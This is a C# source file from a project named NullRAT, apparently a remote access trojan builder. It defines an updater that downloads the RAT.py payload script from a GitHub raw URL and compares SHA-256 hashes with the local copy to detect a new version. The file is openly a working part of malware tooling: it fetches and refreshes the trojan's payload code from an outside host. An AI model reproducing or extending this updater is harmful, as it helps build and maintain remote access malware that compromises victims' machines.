using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Threading.Tasks;
using Spectre.Console;

namespace NullRAT.Variables;
public class Updater
{
    public Stream? Rat_Stream { get; private set; }
    public string? Rat_script { get; private set; }
    public async Task<bool> CheckUpdate()
    {
        RequestResponse ratDl = await GetRAT("https://raw.githubusercontent.com/NullCode1337/NullRAT/source/src/RAT.py", WebData.HttpClient);
        Rat_Stream = ratDl.DataAsStream;
        Rat_script = ratDl.DataAsString.ToString();
        await Rat_Stream.FlushAsync();
        return await CalculateSHA256(Rat_Stream, Environment.CurrentDirectory + "/src/RAT.py");
    }
    private static async Task<bool> CalculateSHA256(Stream File0, string PathToFile1)
    {
        SHA256 SHA256 = SHA256.Create();
        try
        {
            string hash0 = null!, hash1 = null!;
            List<Task<string>> calculateHashes = new()
            {
                // Calculate hash of original RAT.py asynchronously
                Task.Run(
            async () =>
            {
                using FileStream fs = File.OpenRead(PathToFile1);
                byte[] objectiveHash0 = await SHA256.ComputeHashAsync(fs);
                return BitConverter.ToString(objectiveHash0).Replace("-", string.Empty);
            }),
                // Calculate hash of new RAT.py asynchronously
                Task.Run(
            async () =>
            {
                byte[] objectiveHash1 = await SHA256.ComputeHashAsync(File0);
                return BitConverter.ToString(objectiveHash1).Replace("-", string.Empty);
            })
            };

            while (calculateHashes.Count > 0)
            {
                Task<string> completedTask = await Task.WhenAny(calculateHashes);
                if (hash0 is null)
                    hash0 = await completedTask;
                else
                    hash1 = await completedTask;

                calculateHashes.Remove(completedTask);
            }
            return hash0 != hash1;
        }
        catch (Exception ex)
        {
#if DEBUG // IF COMPILING DEBUG PRINT THIS MSGS!
            AnsiConsole.MarkupLine($"[red][[DEBUG]] Error Calculating [yellow bold]SHA256[/], [underline]CAUSE[/] -> -------START TRACE-------\r\n[underline]{ex.ToString().RemoveMarkup()}[/]\r\n-------END TRACE-------[/]");
#endif
        }
        return true;
    }
    private static async Task<RequestResponse> GetRAT(string DownloadURL, HttpClient client)
    {
        try
        {
            HttpResponseMessage hrm = await client.GetAsync(DownloadURL);
            RequestResponse response = new();

            if (hrm.IsSuccessStatusCode)
            {
                response.DataAsStream = hrm.Content.ReadAsStream();
                response.DataAsString = new(await hrm.Content.ReadAsStringAsync());
            }

            response.StatusCode = hrm.StatusCode;
            return response;
        }
        finally
        {
            client.Dispose();
        }
    }
}